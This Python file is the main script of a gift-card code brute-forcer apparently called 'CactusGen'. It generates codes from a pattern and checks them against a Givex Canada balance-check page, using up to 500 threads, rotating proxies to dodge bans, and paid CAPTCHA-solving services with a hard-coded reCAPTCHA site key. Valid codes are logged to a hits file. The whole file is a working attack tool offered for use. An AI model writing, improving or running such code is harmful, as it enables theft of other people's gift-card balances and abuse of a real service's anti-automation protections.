from models.enums.response_type import ResponseType
from models.anticaptcha import AntiCaptcha
from models.twocaptcha import TwoCaptcha
from models.generator import Generator
from models.console import Console
from models.requests import Cactus
from models.proxy import Proxy
from models.valid import Valid

from multiprocessing.pool import ThreadPool as Pool
from threading import Lock

from utils.file_writer import write_file
from utils.file_reader import read_list

from rich import print
import datetime
import random

class Main:
    def __init__(self):
        self.MODULE = Cactus()
        self.Console = Console('CactusGen')
        self.COUNTER = {
            'Start': '',
            'Valid': 0,
            'Invalid': 0,
            'Errors': 0
        }
        self.LOCK = Lock()
        self.GENERATOR = self._load_pattern()
        self.PROXIES = self._load_proxies()
        self.SOLVER = self._load_captcha()
        self._start_threads()

    def _proxy_type(self):
        while True:
            self.Console.print_name()

            print('[yellow]1 - HTTPS[/yellow]')
            print('[yellow]2 - SOCKS4[/yellow]')
            print('[yellow]3 - SOCKS5[/yellow]')
            print('[red]0 - PROXYLESS[/red]')

            response = self.Console.ask_integer('Please select from the menua above')

            if response == 0:
                return None
            elif response == 1:
                return 'http'
            elif response == 2:
                return 'socks4'
            elif response == 3:
                return 'socks5'

    def _load_proxies(self):
        proxy_type = self._proxy_type()

        if proxy_type is None:
            return []

        while True:
            self.Console.print_name()

            file_path = self.Console.ask_string('Please drag in your proxy file').replace('"', '')

            loaded_file = read_list(file_path)

            if loaded_file is False:
                continue

            return [Proxy(proxy, proxy_type) for proxy in loaded_file]

    def _load_threads(self):
        self.Console.print_name()

        threads = self.Console.ask_integer('How many threads should be utilized?')

        if threads == 0:
            return 1

        if threads > 500:
            return 500
        
        return threads

    def _load_pattern(self):
        while True:
            self.Console.print_name()

            print('[yellow]# - Random Digit[/yellow]')
            print('[yellow]* - Random Letter[/yellow]')
            print('[yellow]@ - Random Alphanumeric Character[/yellow]')

            gen = Generator(self.Console.ask_string('Please enter a pattern'))

            print(f'[green]{gen.generate()}[/green]')
            
            response = self.Console.ask_string('[yellow]Does this look correct? (Y/N)[/yellow]').upper()

            if response == 'Y':
                return gen

    def _load_captcha(self):
        while True:
            self.Console.print_name()

            api_key = self.Console.ask_string('Please paste your captcha API key')

            print('[yellow]1 - 2captcha[/yellow]')
            print('[yellow]2 - AntiCaptcha[/yellow]')

            response = self.Console.ask_integer('Please choose from the menu above')

            if response == 1:
                return TwoCaptcha(api_key, '6LdUCxYTAAAAANMjMuPFMrC1GyTHmem5M1llJ8Id', 'https://wwws-canada2.givex.com/public/balance/balancecheck_new.py?_LANGUAGE_:en+16986')
            elif response == 2:
                return AntiCaptcha(api_key, '6LdUCxYTAAAAANMjMuPFMrC1GyTHmem5M1llJ8Id', 'https://wwws-canada2.givex.com/public/balance/balancecheck_new.py?_LANGUAGE_:en+16986')

    def _random_proxy(self):
        if len(self.PROXIES) == 0:
            return Proxy(None, None)
        return random.choice(self.PROXIES)

    def _check(self):
        while True:
            serial = self.GENERATOR.generate()

            status = self.MODULE.check_code(serial, self._random_proxy(), self.SOLVER)

            while status == ResponseType.BANNED:
                with self.LOCK:
                    self.COUNTER['Errors'] += 1
                    self.Console.set_title(self.COUNTER)
                status = self.MODULE.check_code(serial, self._random_proxy(), self.SOLVER)

            if status == ResponseType.FAILURE:
                with self.LOCK:
                    self.COUNTER['Invalid'] += 1
                    self.Console.set_title(self.COUNTER)
                continue

            with self.LOCK:
                self.COUNTER['Valid'] += 1
                self.Console.set_title(self.COUNTER)
                print(f'[green]{status.get_value()}[/green]')
                write_file(f'Results/{self.COUNTER["Start"]}', 'Hits.txt', status.get_value())
                self.Console.set_title(self.COUNTER)
    
    def _start_threads(self):
        threads = self._load_threads()
        pool = Pool(threads)

        self.COUNTER['Start'] = datetime.datetime.now().strftime('%m-%d-%Y %H.%M')

        self.Console.print_name()

        for _ in range(threads):
            pool.apply_async(self._check, ())
        pool.close()
        pool.join()

Main()